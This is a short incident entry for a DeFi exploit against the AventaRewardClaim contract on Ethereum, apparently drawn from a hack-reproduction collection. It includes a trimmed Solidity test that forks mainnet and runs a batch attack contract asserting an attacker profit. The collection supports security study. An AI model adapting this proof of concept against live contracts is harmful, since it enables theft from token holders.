# [?] AventaRewardClaim - Claim Accounting

## Summary
Severity: Unknown
Chain: Ethereum
Component: AventaRewardClaim
Published: 2025-04-27
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-04/AventaRewardClaim_exp.sol
Type: defi-exploit-poc

## Details
Lost: 16,019,528 AVENTA

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("mainnet", 22_358_982);

        fundingToken = address(0);
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(HISTORICAL_ATTACK_CONTRACT, "Historical attack contract");
        vm.label(VICTIM_OWNER, "Aventa owner/victim");
        vm.label(AVENTA_REWARD_CLAIM, "AventaRewardClaim");
        vm.label(AVENTA_TOKEN, "AVENTA");
        vm.label(INTELLIQUANT_TOKEN, "IntelliQuant");
        vm.label(FLASH_PAIR, "Uniswap flash pair");
        vm.label(UNISWAP_V2_ROUTER, "Uniswap V2 router");
        vm.label(WETH_TOKEN, "WETH");
    }

    function testExploit() public balanceLog {
        uint256 attackerEthBefore = ATTACKER.balance;

        AventaRewardClaimBatch exploit = new AventaRewardClaimBatch();
        exploit.attack();

        uint256 attackerProfit = ATTACKER.balance - attackerEthBefore;
        assertGt(attackerProfit, 3 ether);
    }
}

contract AventaRewardClaimBatch {
    function attack() external {
        for (uint256 i; i < HELPER_COUNT; ++i) {
            new AventaRewardClaimHelper().attack();
        }
    }
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-04/AventaRewardClaim_exp.sol_
